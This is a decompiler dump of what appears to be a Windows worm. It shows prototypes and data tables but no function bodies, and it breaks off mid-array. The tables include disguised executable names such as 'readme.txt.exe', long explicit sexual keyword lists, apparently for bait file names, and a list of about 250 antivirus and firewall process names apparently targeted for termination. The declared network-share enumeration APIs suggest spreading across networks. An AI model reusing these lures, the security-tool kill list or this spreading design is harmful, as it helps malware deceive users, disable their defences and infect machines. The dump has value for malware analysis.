/* This file was generated by the Hex-Rays decompiler version 8.3.0.230608.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>

#include <stdarg.h>


//-------------------------------------------------------------------------
// Function declarations

int __cdecl sub_401000(_DWORD *a1, _DWORD *a2, _DWORD *a3, _DWORD *a4);
UINT __cdecl sub_401080(void *a1);
int sub_4010D0();
int __cdecl sub_401200(BYTE *lpData, DWORD cbData); // idb
int __cdecl sub_401290(BYTE *lpData, DWORD cbData, LPCSTR lpMachineName); // idb
int __cdecl sub_401340(const CHAR *a1);
int __cdecl sub_4013B0(BYTE *a1, char *a2, const CHAR *a3, const CHAR *a4);
char *__cdecl sub_401530(char *a1);
int __cdecl sub_401590(BYTE *a1, const char *a2, const CHAR *a3, const CHAR *a4);
int __cdecl sub_401640(LPNETRESOURCEA lpNetResource, BYTE *a2);
void __cdecl __noreturn sub_401970(BYTE *a1);
void __cdecl __noreturn sub_401A40(BYTE *a1);
void __noreturn sub_401A70(void); // weak
int __stdcall sub_401B90(int a1, int a2, int a3, int a4);
int __cdecl sub_401C90(int a1, int a2);
DWORD sub_401CB0();
// unsigned int __usercall sub_401CF0@<eax>(unsigned int result@<eax>, _BYTE *a2);
void __cdecl sub_401D40(_BYTE *a1);
BOOL __cdecl sub_401D90(const CHAR *a1, const CHAR *a2);
char *__cdecl sub_401EE0(int a1, int a2);
_BYTE *__cdecl sub_401F60(const char *a1, _BYTE *a2);
// int __usercall sub_4020B0@<eax>(BOOL NextFileA@<esi>, LPCSTR lpFileName);
int __cdecl sub_4021E0(const char *a1);
int __cdecl sub_4022E0(int a1);
int __cdecl sub_402360(const char *a1);
int __cdecl sub_4023A0(int a1, int a2);
int __cdecl sub_4023D0(int a1, int a2);
BOOL sub_402430();
int __cdecl sub_4024E0(char *a1);
void __stdcall __noreturn sub_4026B0(LPVOID lpThreadParameter);
BOOL __stdcall EnumFunc(HWND hWnd, LPARAM a2); // idb
void __stdcall __noreturn StartAddress(LPVOID lpThreadParameter);
char __cdecl sub_4027D0(int a1);
void __stdcall __noreturn sub_402830(LPVOID lpThreadParameter);
int __cdecl sub_402A20(CHAR *a1, const CHAR *a2, int a3);
int __cdecl sub_402B20(CHAR *a1, LPCSTR lpUserName, int a3);
int __cdecl sub_402C20(CHAR *a1);
CHAR *__cdecl sub_402CA0(int a1);
int __cdecl sub_402CE0(int a1);
int __cdecl sub_402D30(int a1);
int __cdecl sub_402D80(int a1);
int __cdecl sub_402DE0(int a1);
int __cdecl sub_402E30(int a1);
int __cdecl sub_402E80(int a1);
int __cdecl sub_402ED0(int a1);
char *__cdecl sub_402F20(char *a1);
int __cdecl sub_403130(u_short a1);
int sub_4032C0();
int __cdecl sub_4032F0(const char *a1);
int sub_4034F0();
int sub_403500();
int __cdecl sub_403520(_DWORD *a1, int a2);
int __cdecl sub_403550(_DWORD *a1, int a2);
int __cdecl sub_403590(int a1, int a2, int a3);
// DWORD __stdcall WNetAddConnection2A(LPNETRESOURCEA lpNetResource, LPCSTR lpPassword, LPCSTR lpUserName, DWORD dwFlags);
// DWORD __stdcall WNetCancelConnection2A(LPCSTR lpName, DWORD dwFlags, BOOL fForce);
// DWORD __stdcall WNetOpenEnumA(DWORD dwScope, DWORD dwType, DWORD dwUsage, LPNETRESOURCEA lpNetResource, LPHANDLE lphEnum);
// DWORD __stdcall WNetEnumResourceA(HANDLE hEnum, LPDWORD lpcCount, LPVOID lpBuffer, LPDWORD lpBufferSize);
// DWORD __stdcall WNetCloseEnum(HANDLE hEnum);
// DWORD __stdcall WNetGetConnectionA(LPCSTR lpLocalName, LPSTR lpRemoteName, LPDWORD lpnLength);
// HANDLE __stdcall CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
// BOOL __stdcall Process32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
// BOOL __stdcall Process32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
// int __stdcall WSAStartup(WORD wVersionRequested, LPWSADATA lpWSAData);
// int __stdcall WSACleanup();
// unsigned int __stdcall inet_addr(const char *cp);
// struct hostent *__stdcall gethostbyname(const char *name);
// struct hostent *__stdcall gethostbyaddr(const char *addr, int len, int type);
int sub_403680();
int __cdecl sub_403730(_BYTE *a1, unsigned __int8 *a2, int a3);
char *__cdecl sub_403780(char *a1, char *a2);
int __cdecl sub_4037B0(int a1);
int __cdecl sub_403A50(int a1);
LPVOID __cdecl sub_403DC0(SIZE_T dwBytes);
char *__cdecl sub_403E00(char *lpMem, SIZE_T dwBytes);
_BYTE *__cdecl sub_4041B0(char *lpMem, SIZE_T dwBytes);
unsigned int __cdecl sub_4042C0(int a1);
void __cdecl sub_404670(char *lpMem);
_BYTE *__cdecl sub_4046B0(_BYTE *a1, _BYTE *a2, int a3);
int sub_4046D0(int a1, char *a2, ...);
void sub_404710();
// void __usercall sub_404730(unsigned int a1@<eax>);
unsigned int __cdecl sub_404760(unsigned int *a1);
int __cdecl sub_4047B0(int a1);
_BYTE *__cdecl sub_4047D0(_BYTE *a1, char *a2);
_DWORD *__cdecl sub_404830(const CHAR *a1, _BYTE *a2);
int sub_404850();
unsigned int *__cdecl sub_404920(_DWORD *a1);
_BYTE *__cdecl sub_404940(_BYTE *a1, unsigned int a2, char *a3, int a4);
int __cdecl sub_404970(int a1, unsigned __int8 *a2, int a3);
int sub_4049A0(int a1, char *a2, ...);
int sub_4049D0();
int sub_404A00();
int __cdecl sub_404A20(char *lpMem);
_BYTE *__cdecl sub_404B00(_BYTE *a1);
BOOL __stdcall HandlerRoutine(DWORD CtrlType); // idb
int __cdecl sub_404B60(int a1, int a2);
void __cdecl __noreturn sub_404BD0(UINT uExitCode); // idb
void __noreturn start(); // weak
char *__cdecl sub_404D40(SIZE_T dwSize);
BOOL sub_404DF0();
LPVOID __cdecl sub_404E30(SIZE_T dwBytes);
LPVOID __cdecl sub_404E50(void *a1, SIZE_T a2);
BOOL __cdecl sub_404E70(LPVOID lpMem);
SIZE_T __cdecl sub_404E90(LPCVOID lpMem);
_BYTE *__cdecl sub_404EE0(_BYTE *a1, _BYTE *a2, int a3);
int __cdecl sub_404F00(int a1);
int __cdecl sub_404F30(char *lpMem);
int __cdecl sub_404F60(int (__cdecl *a1)(int, char *, int), int a2, char *a3, int a4);
unsigned int __stdcall sub_4051E0(__int64 a1, unsigned __int64 a2);
_BYTE *__cdecl sub_405250(_BYTE *a1, char a2);
_WORD *sub_405280();
_DWORD *__cdecl sub_4052E0(const CHAR *a1, _BYTE *a2, _DWORD *a3, int a4);
char *__cdecl sub_405430(char *a1);
int sub_405540();
char *__cdecl sub_4055B0(char *a1, int a2, _DWORD *a3);
unsigned int __cdecl sub_405630(unsigned __int8 *a1, unsigned __int8 **a2, int a3);
int __cdecl sub_405710(int a1, int a2);
unsigned int *__cdecl sub_405770(unsigned int *a1, unsigned int a2, unsigned int a3);
_BYTE *__cdecl sub_405910(_BYTE *a1, unsigned int a2, char *a3, int a4, int a5);
unsigned int __cdecl sub_405AC0(unsigned __int8 *a1, unsigned int a2, int a3, int a4);
int __cdecl sub_405BE0(int a1);
int __cdecl sub_405C10(int a1);
int __cdecl sub_405CE0(int a1);
int __cdecl sub_405DB0(LPCSTR lpFileName); // idb
void __cdecl __noreturn sub_405DC0(UINT uExitCode); // idb
int __cdecl sub_405DD8(int a1, int a2, int a3);
void __cdecl sub_405EC0(void *a1);
int __cdecl sub_405EE0(int a1, int a2, int a3, _DWORD *a4);
// int __usercall sub_405F10@<eax>(int a1@<ebp>, int a2, int a3);
BOOL sub_405F90();
void __stdcall sub_405FC0(int a1);
// int __userpurge sub_405FCC@<eax>(int result@<eax>, int a2@<ebp>, int a3);
void sub_405FF0();
UINT sub_406050();
void sub_4062A0();
_DWORD *__cdecl sub_4062D0(unsigned __int8 *a1, unsigned __int8 **a2, unsigned __int8 *a3, _DWORD *a4, _DWORD *a5);
int sub_406490();
BOOL sub_406530();
LPSTR sub_4065F0();
LONG __cdecl sub_406630(void *a1, struct _EXCEPTION_POINTERS *ExceptionInfo);
int __cdecl sub_4066A0(unsigned __int16 *a1, char *a2, int a3, int a4);
int __cdecl sub_406990(int a1, int *a2, unsigned __int8 a3, int a4);
int __cdecl sub_4070F0(int a1, int a2);
int __cdecl sub_407370(const CHAR *a1, char a2);
int __cdecl sub_4073E0(unsigned __int8 *a1);
int __cdecl sub_407440(int a1, unsigned __int16 *a2, __int16 a3);
const char *sub_407500();
unsigned int __cdecl sub_407650(unsigned __int8 *a1, unsigned __int8 **a2, int a3);
int __cdecl sub_4077E0(_DWORD *a1);
char *__cdecl sub_407990(int a1, int a2, int a3, int *a4, char a5, int a6);
BOOL __cdecl sub_407A20(int a1);
int __cdecl sub_407AA0(int a1, int a2, int a3);
int __cdecl sub_407AE0(int a1, int a2, int a3);
int __cdecl sub_407B90(int a1, int a2, int a3);
int __cdecl sub_407BF0(int a1, int a2, int a3);
int __cdecl sub_407C30(_DWORD *a1, unsigned __int8 *a2);
const char *__cdecl sub_407D20(_DWORD *a1, int a2);
unsigned __int8 *__cdecl sub_407E10(int a1, int a2, int a3, unsigned __int8 a4, _DWORD *a5, unsigned __int8 *a6);
int __cdecl sub_408570(int a1);
unsigned __int8 *__cdecl sub_408680(unsigned __int8 *a1, unsigned __int8 a2, int a3);
void __noreturn sub_4086B0(void); // weak
int __cdecl sub_4086D0(int a1, _BYTE *lpBuffer, DWORD nNumberOfBytesToWrite);
int sub_4088F0();
int __cdecl sub_4089C0(int a1);
int __cdecl sub_408A60(int a1, HANDLE hHandle); // idb
int __cdecl sub_408B00(int a1);
int __cdecl sub_408B60(HANDLE hFile, __int16 a2); // idb
int __cdecl sub_408C30(int a1);
int __cdecl sub_408DA0(LPCSTR lpFileName); // idb
int __cdecl sub_408DD0(int a1);
int __cdecl sub_408DE0(int a1, unsigned __int16 *a2);
int __cdecl sub_408F40(int a1, char a2);
int __cdecl sub_4091A0(_WORD *a1);
_BYTE *__cdecl sub_4091B0(int a1, char a2);
// int __usercall sub_409850@<eax>(int a1@<esi>, const CHAR *a2, __int16 a3, int a4);
int __cdecl sub_409880(const CHAR *a1, __int16 a2, int a3, int a4, int a5);
int __cdecl sub_409C40(unsigned __int8 *a1, unsigned __int8 *a2, int a3);
int __cdecl sub_409CA0(unsigned __int8 *a1, int a2);
char *__cdecl sub_409CF0(unsigned __int8 *a1);
int __cdecl sub_409E80(int a1);
int __cdecl sub_409FD0(int a1, LONG a2, DWORD a3);
int __cdecl sub_40A080(_BYTE *a1, unsigned __int16 a2, int a3);
unsigned __int64 __stdcall sub_40A2D0(__int64 a1, unsigned __int64 a2);
int __stdcall sub_40A350(__int64 a1, unsigned __int64 a2);
unsigned __int64 __stdcall sub_40A400(__int64 a1, __int64 a2);
int __cdecl sub_40A440(_WORD *a1);
int __cdecl sub_40A4B0(_WORD *a1, unsigned __int16 *a2);
int __cdecl sub_40A4D0(unsigned __int16 *a1, int a2);
// __int64 __usercall sub_40A4F0@<edx:eax>(double a1@<st0>);
int __cdecl sub_40A520(int a1, int a2);
int __cdecl sub_40A550(int a1, char a2, _BYTE *a3, __int16 a4, __int16 a5);
DWORD __cdecl sub_40AA60(int a1, _BYTE *a2, DWORD nNumberOfBytesToRead);
// int __usercall sub_40ADC0@<eax>(LONG a1@<edi>, int a2@<esi>, int a3, LONG a4);
int __cdecl sub_40AF40(_BYTE *a1, int a2);
int __cdecl sub_40B040(_WORD *a1, unsigned __int16 *a2);
int __cdecl sub_40B0E0(unsigned __int16 *a1, int a2);
int __cdecl sub_40B300(int a1, int a2);
int __cdecl sub_40B330(int a1, int a2);
_BYTE *__cdecl sub_40B400(_BYTE *a1, char a2);
int __cdecl sub_40B430(unsigned __int16 *a1);
// void __stdcall RtlUnwind(PVOID TargetFrame, PVOID TargetIp, PEXCEPTION_RECORD ExceptionRecord, PVOID ReturnValue);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN loc_405ED8; // weak
_UNKNOWN unk_40C003; // weak
_UNKNOWN unk_40C102; // weak
_UNKNOWN unk_40C20B; // weak
char *off_40C280[28] =
{
  "install.exe",
  "readme.txt.exe",
  "notes.txt.exe",
  "setup.exe",
  "edit.exe",
  "start.exe",
  "install32.exe",
  "driver.exe",
  "game3d.exe",
  "screensaver.scr",
  "uninstall.exe",
  "deinstall.exe",
  "hdcleaner.exe",
  "drwatson32.exe",
  "safetyserver.exe",
  "rundll64.exe",
  "speedup.exe",
  "defrag64.exe",
  "summergames.exe",
  "soccer.exe",
  "word.exe",
  "defrag.exe",
  "unformat.exe",
  "undelete.exe",
  "pgp9.exe",
  "IE9setup.exe",
  "explorer.exe",
  "freeftp.exe"
}; // weak
_UNKNOWN unk_40C307; // weak
_UNKNOWN unk_40C4DC; // weak
_UNKNOWN unk_40C8DC; // weak
_UNKNOWN unk_40CA14; // weak
_UNKNOWN unk_40CA27; // weak
const CHAR DisplayName = '\0'; // idb
_UNKNOWN unk_40D2F8; // weak
char *off_410E64[133] =
{
  "tyrkish",
  "german",
  "american",
  "african",
  "black",
  "chinese",
  "japanese",
  "malaysia",
  "russian",
  "norwegian",
  "danish",
  "french",
  "italian",
  "spanish",
  "brasilian",
  "canadian",
  "swedish",
  "asian",
  "indian",
  "british",
  "Sonja",
  "Tatjana",
  "Kathrin",
  "Janette",
  "Sonja",
  "Sylvia",
  "Jenna",
  "Samantha",
  "Gina",
  "Karin",
  "Britney",
  "Curtney",
  "Anniston",
  "Melissa",
  "Sandy",
  "Liz",
  "Christine",
  "Sarah",
  "Ashley",
  "Jade",
  "blondie",
  "balls",
  "mistress",
  "lady",
  "redhair",
  "swallow",
  "ash",
  "sm",
  "bondage",
  "castration",
  "femdom",
  "stockings",
  "granny",
  "40+",
  "50+",
  "mature",
  "pregnant",
  "shoes",
  "high heels",
  "black hairunshaved",
  "hairy",
  "upskirt",
  "boots",
  "latex",
  "leather",
  "fishy",
  "penetration",
  "ejaculation",
  "circumcision",
  "young",
  "girly",
  "traffic",
  "shower",
  "hotel",
  "bedroom",
  "sweet",
  "beautyfull",
  "gorgeoushorny",
  "wifey",
  "titts",
  "boobs",
  "cock",
  "vagina",
  "glans",
  "legs",
  "feet",
  "ash",
  "hole",
  "nipples",
  "catfight",
  "licking",
  "hidden",
  "voyeur",
  "masturbation",
  "sleeping",
  "lesbian",
  "[bangbus]",
  "[milf]",
  "public",
  "uncut",
  "big",
  "full movie",
  "hot (!)",
  "[free]",
  "several models",
  "girls",
  "porn",
  "xxx",
  "animal",
  "beast",
  "beastiality",
  "horse",
  "cum",
  "sperm",
  "nude",
  "bukkake",
  "handjob",
  "blowjob",
  "cumshot",
  "hardcore",
  "kicking",
  "trambling",
  "fetish",
  "lingerie",
  "action",
  "fucking",
  "gang bang",
  "lesbian",
  "horse",
  "gay",
  "mpg",
  "avi",
  "mpeg"
}; // weak
char *off_410EB4[113] =
{
  "Sonja",
  "Tatjana",
  "Kathrin",
  "Janette",
  "Sonja",
  "Sylvia",
  "Jenna",
  "Samantha",
  "Gina",
  "Karin",
  "Britney",
  "Curtney",
  "Anniston",
  "Melissa",
  "Sandy",
  "Liz",
  "Christine",
  "Sarah",
  "Ashley",
  "Jade",
  "blondie",
  "balls",
  "mistress",
  "lady",
  "redhair",
  "swallow",
  "ash",
  "sm",
  "bondage",
  "castration",
  "femdom",
  "stockings",
  "granny",
  "40+",
  "50+",
  "mature",
  "pregnant",
  "shoes",
  "high heels",
  "black hairunshaved",
  "hairy",
  "upskirt",
  "boots",
  "latex",
  "leather",
  "fishy",
  "penetration",
  "ejaculation",
  "circumcision",
  "young",
  "girly",
  "traffic",
  "shower",
  "hotel",
  "bedroom",
  "sweet",
  "beautyfull",
  "gorgeoushorny",
  "wifey",
  "titts",
  "boobs",
  "cock",
  "vagina",
  "glans",
  "legs",
  "feet",
  "ash",
  "hole",
  "nipples",
  "catfight",
  "licking",
  "hidden",
  "voyeur",
  "masturbation",
  "sleeping",
  "lesbian",
  "[bangbus]",
  "[milf]",
  "public",
  "uncut",
  "big",
  "full movie",
  "hot (!)",
  "[free]",
  "several models",
  "girls",
  "porn",
  "xxx",
  "animal",
  "beast",
  "beastiality",
  "horse",
  "cum",
  "sperm",
  "nude",
  "bukkake",
  "handjob",
  "blowjob",
  "cumshot",
  "hardcore",
  "kicking",
  "trambling",
  "fetish",
  "lingerie",
  "action",
  "fucking",
  "gang bang",
  "lesbian",
  "horse",
  "gay",
  "mpg",
  "avi",
  "mpeg"
}; // weak
char *off_410F04[93] =
{
  "blondie",
  "balls",
  "mistress",
  "lady",
  "redhair",
  "swallow",
  "ash",
  "sm",
  "bondage",
  "castration",
  "femdom",
  "stockings",
  "granny",
  "40+",
  "50+",
  "mature",
  "pregnant",
  "shoes",
  "high heels",
  "black hairunshaved",
  "hairy",
  "upskirt",
  "boots",
  "latex",
  "leather",
  "fishy",
  "penetration",
  "ejaculation",
  "circumcision",
  "young",
  "girly",
  "traffic",
  "shower",
  "hotel",
  "bedroom",
  "sweet",
  "beautyfull",
  "gorgeoushorny",
  "wifey",
  "titts",
  "boobs",
  "cock",
  "vagina",
  "glans",
  "legs",
  "feet",
  "ash",
  "hole",
  "nipples",
  "catfight",
  "licking",
  "hidden",
  "voyeur",
  "masturbation",
  "sleeping",
  "lesbian",
  "[bangbus]",
  "[milf]",
  "public",
  "uncut",
  "big",
  "full movie",
  "hot (!)",
  "[free]",
  "several models",
  "girls",
  "porn",
  "xxx",
  "animal",
  "beast",
  "beastiality",
  "horse",
  "cum",
  "sperm",
  "nude",
  "bukkake",
  "handjob",
  "blowjob",
  "cumshot",
  "hardcore",
  "kicking",
  "trambling",
  "fetish",
  "lingerie",
  "action",
  "fucking",
  "gang bang",
  "lesbian",
  "horse",
  "gay",
  "mpg",
  "avi",
  "mpeg"
}; // weak
char *off_410FA0[54] =
{
  "titts",
  "boobs",
  "cock",
  "vagina",
  "glans",
  "legs",
  "feet",
  "ash",
  "hole",
  "nipples",
  "catfight",
  "licking",
  "hidden",
  "voyeur",
  "masturbation",
  "sleeping",
  "lesbian",
  "[bangbus]",
  "[milf]",
  "public",
  "uncut",
  "big",
  "full movie",
  "hot (!)",
  "[free]",
  "several models",
  "girls",
  "porn",
  "xxx",
  "animal",
  "beast",
  "beastiality",
  "horse",
  "cum",
  "sperm",
  "nude",
  "bukkake",
  "handjob",
  "blowjob",
  "cumshot",
  "hardcore",
  "kicking",
  "trambling",
  "fetish",
  "lingerie",
  "action",
  "fucking",
  "gang bang",
  "lesbian",
  "horse",
  "gay",
  "mpg",
  "avi",
  "mpeg"
}; // weak
char *off_410FC8[44] =
{
  "catfight",
  "licking",
  "hidden",
  "voyeur",
  "masturbation",
  "sleeping",
  "lesbian",
  "[bangbus]",
  "[milf]",
  "public",
  "uncut",
  "big",
  "full movie",
  "hot (!)",
  "[free]",
  "several models",
  "girls",
  "porn",
  "xxx",
  "animal",
  "beast",
  "beastiality",
  "horse",
  "cum",
  "sperm",
  "nude",
  "bukkake",
  "handjob",
  "blowjob",
  "cumshot",
  "hardcore",
  "kicking",
  "trambling",
  "fetish",
  "lingerie",
  "action",
  "fucking",
  "gang bang",
  "lesbian",
  "horse",
  "gay",
  "mpg",
  "avi",
  "mpeg"
}; // weak
char *off_41100C[27] =
{
  "porn",
  "xxx",
  "animal",
  "beast",
  "beastiality",
  "horse",
  "cum",
  "sperm",
  "nude",
  "bukkake",
  "handjob",
  "blowjob",
  "cumshot",
  "hardcore",
  "kicking",
  "trambling",
  "fetish",
  "lingerie",
  "action",
  "fucking",
  "gang bang",
  "lesbian",
  "horse",
  "gay",
  "mpg",
  "avi",
  "mpeg"
}; // weak
char *off_41106C[3] = { "mpg", "avi", "mpeg" }; // weak
_UNKNOWN unk_411080; // weak
_UNKNOWN unk_41147C; // weak
int dword_4118F0[] = { 1 }; // weak
_UNKNOWN unk_411910; // weak
unsigned __int8 byte_411A90[3] = { 84u, 90u, 0u }; // weak
_UNKNOWN unk_411A9C; // weak
_UNKNOWN unk_411AB4; // weak
int dword_411DA4[4] = { 0, 0, 1, 2 }; // weak
char a022hu31022hu11[25] = ":%02.2hu31%02.2hu-%1.1hu"; // weak
char a0123456789abcd[37] = "0123456789abcdefghijklmnopqrstuvwxyz"; // weak
char byte_411E51[139] =
{
  '\0',
  '\0',
  '!',
  '\x15',
  '\x11',
  '\x0E',
  '\r',
  '\f',
  '\v',
  '\v',
  '\n',
  '\n',
  '\t',
  '\t',
  '\t',
  '\t',
  '\t',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\0',
  '\0',
  'n',
  '~',
  '@',
  '\0',
  '\xAA',
  '~',
  '@',
  '\0',
  '\xF5',
  '~',
  '@',
  '\0',
  'z',
  '\x7F',
  '@',
  '\0',
  'F',
  '\x85',
  '@',
  '\0',
  '\xBF',
  '\x7F',
  '@',
  '\0',
  '\x19',
  '€',
  '@',
  '\0',
  'R',
  '€',
  '@',
  '\0',
  'u',
  '€',
  '@',
  '\0',
  'F',
  '\x85',
  '@',
  '\0',
  'F',
  '\x85',
  '@',
  '\0',
  'F',
  '\x85',
  '@',
  '\0',
  '\xEE',
  '€',
  '@',
  '\0',
  'F',
  '\x85',
  '@',
  '\0',
  'F',
  '\x85',
  '@',
  '\0',
  'F',
  '\x85',
  '@',
  '\0',
  'F',
  '\x85',
  '@',
  '\0',
  'n',
  '\x81',
  '@',
  '\0',
  '~',
  '\x81',
  '@',
  '\0',
  '\xB0',
  '\x81',
  '@',
  '\0',
  '\xFB',
  '\x81',
  '@',
  '\0',
  '-',
  '\x82',
  '@',
  '\0',
  '\x84',
  '\x82',
  '@',
  '\0',
  '\xE2',
  '\x82',
  '@',
  '\0',
  '\x06',
  '\x84',
  '@',
  '\0'
}; // weak
_UNKNOWN unk_411F60; // weak
double dbl_4123AC[9] = { 10.0, 100.0, 10000.0, 1.0e8, 1.0e16, 1.0e32, 1.0e64, 1.0e128, 1.0e256 }; // weak
_BYTE byte_412436[2] = { 78, 65 }; // weak
int dword_412438 = 1634598990; // weak
_UNKNOWN unk_4124F8; // weak
void (*dword_412504[63])(void) =
{
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL
}; // weak
char *off_413000[254] =
{
  "AGENTSVR",
  "ANTI-TROJAN",
  "ANTIVIRUS",
  "ANTS",
  "APIMONITOR",
  "APLICA32",
  "APVXDWIN",
  "ATCON",
  "ATGUARD",
  "ATRO55EN",
  "ATUPDATER",
  "ATWATCH",
  "AVGUARD",
  "AVGNT",
  "AUPDATE",
  "AUTODOWN",
  "AUTOTRACE",
  "AUTOUPDATE",
  "AVCONSOL",
  "AVGSERV9",
  "AVLTMAIN",
  "AVPUPD",
  "AVSYNMGR",
  "AVWUPD32",
  "AVXQUAR",
  "AVprotect9X",
  "AVWUPSRV",
  "AVWIN",
  "BD_PROFESSIONAL",
  "BIDEF",
  "BIDSERVER",
  "BIPCP",
  "BIPCPEVALSETUP",
  "BISP",
  "BLACKD",
  "BLACKICE",
  "BOOTWARN",
  "BORG",
  "BORG2",
  "BS120",
  "CCAPP",
  "CFGWIZ",
  "CFIADMIN",
  "CFIAUDIT",
  "CFINET",
  "CFINET32",
  "CLEAN",
  "CLEANER",
  "CLEANER3",
  "CLEANPC",
  "CMGRDIAN",
  "CMON016",
  "CPF9X206",
  "CPFNT206",
  "CWNB181",
  "CWNTDWMO",
  "D3DUPDATE",
  "DEFWATCH",
  "DEPUTY",
  "DPFSETUP",
  "DRWATSON",
  "DRWEBUPW",
  "ESCANH95",
  "ESCANHNT",
  "ETrust",
  "ESCANV95",
  "FIREWALL",
  "FLOWPROTECTOR",
  "FP-WIN_TRIAL",
  "FSAV",
  "F-PROT",
  "FPROT",
  "FSAV53",
  "FSAV95",
  "GBMENU",
  "GBPOLL",
  "GUARD",
  "HACKTRACERSETUP",
  "HTLOG",
  "HWPE",
  "IAMAPP",
  "IAMSERV",
  "ICLOAD95",
  "ICLOADNT",
  "ICMON",
  "ICSSUPPNT",
  "ICSUPP95",
  "ICSUPPNT",
  "IFW2000",
  "IPARMOR",
  "IRIS",
  "JAMMER",
  "KAVLITE",
  "KAVPERS",
  "KERIO",
  "KILLPROCESS",
  "LOCKDOWN",
  "LSETUP",
  "LUALL",
  "LUCOMSERVER",
  "LUINIT",
  "MCAGENT",
  "MCUPDATE",
  "MFW2EN",
  "MFWENG3",
  "MINILOG",
  "MOOLIVE",
  "MRFLUX",
  "MSCONFIG",
  "MSINFO32",
  "NAV80TRY",
  "NAVAPW32",
  "NAVDX",
  "NAVSTUB",
  "NAVW32",
  "NC2000",
  "NCINST4",
  "NEOMONITOR",
  "NETARMOR",
  "NETINFO",
  "NETMON",
  "NETSCANPRO",
  "NETSPYHUNTER",
  "NETSTAT",
  "NISSERV",
  "NISUM",
  "NORTON",
  "NPFMESSENGER",
  "NPROTECT",
  "NSCHED32",
  "NTVDM",
  "NUPGRADE",
  "NVARCH16",
  "NWINST4",
  "NWTOOL16",
  "OSTRONET",
  "OUTPOST",
  "OUTPOSTINSTALL",
  "OUTPOSTPROINSTALL",
  "PADMIN",
  "PANIXK",
  "PAVPROXY",
  "PCC2K",
  "PCCIOMON",
  "PCDSETUP",
  "PCFWALLICON",
  "PDSETUP",
  "PERISCOPE",
  "PERSFW",
  "PFWADMIN",
  "PINGSCAN",
  "POPROXY",
  "POPSCAN",
  "PORTDETECTIVE",
  "PPINUPDT",
  "PPTBC",
  "PPVSTOP",
  "PROCEXPLORERV",
  "PROPORT",
  "PROTECTX",
  "PURGE",
  "PVIEW",
  "QCONSOLE",
  "QSERVER",
  "RAV8WIN32ENG",
  "RESCUE",
  "RESCUE32",
  "RRGUARD",
  "RSHELL",
  "RTVSCN95",
  "RULAUNCH",
  "SAFEWEB",
  "SBSERV",
  "SETUPVAMEEVAL",
  "FLOWPROTECTOR",
  "SGSSFW32",
  "AVSERVE",
  "SHELLSPYINSTALL",
  "SOFI",
  "SPHINX",
  "SPYXX",
  "SS3EDIT",
  "ST2",
  "SUPFTRL",
  "SUPPORTER5",
  "SYMPROXYSVC",
  "SYSEDIT",
  "TASKMGR",
  "TASKMON",
  "TAUMON",
  "TAUSCAN",
  "TDS2-NT",
  "TFAK5",
  "TGBOB",
  "TITANIN",
  "TITANINXP",
  "TRACERT",
  "TRJSCAN",
  "TRJSETUP",
  "TROJANTRAP",
  "UNDOBOOT",
  "UPDATE",
  "VBCMSERV",
  "VBCONS",
  "VBUST",
  "VBWIN9X",
  "VBWINNTW",
  "VCSETUP",
  "VFSETUP",
  "VNLAN300",
  "VNPC3000",
  "VPC42",
  "VPFW30S",
  "VPTRAY",
  "VSCENU6",
  "VSECOMR",
  "VSHWIN32",
  "VSISETUP",
  "VSMAIN",
  "VSMON",
  "VSSTAT",
  "VSWIN9XE",
  "VSWINNTSE",
  "VSWINPERSE",
  "W32DSM89",
  "WATCHDOG",
  "WEBSCANX",
  "WHOSWATCHINGME",
  "WINRECON",
  "WRADMIN",
  "WRCTRL",
  "WSBGATE",
  "XPF202EN",
  "ZAPRO",
  "ZAPSETUP3001",
  "ZATUTOR",
  "ZAUINST",
  "ZONALM",
  "ZONEALARM",
  "ZLCLIENT",
  "ANTIVIR",
  "PANDA",
  "KAPERSKY",
  "CAISAFE",
  "VETEBOOT",
  "VETEFILE",
  "VET-FILT",
  "VETMONNT",
  "VETMSGNT",
  "VET-REC",
  "MCAFEE",
  "PROCESS VIEWER",
  "BITDEFENDER",
  "BIT-DEFENDER"
}; // weak
CHAR File[255] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
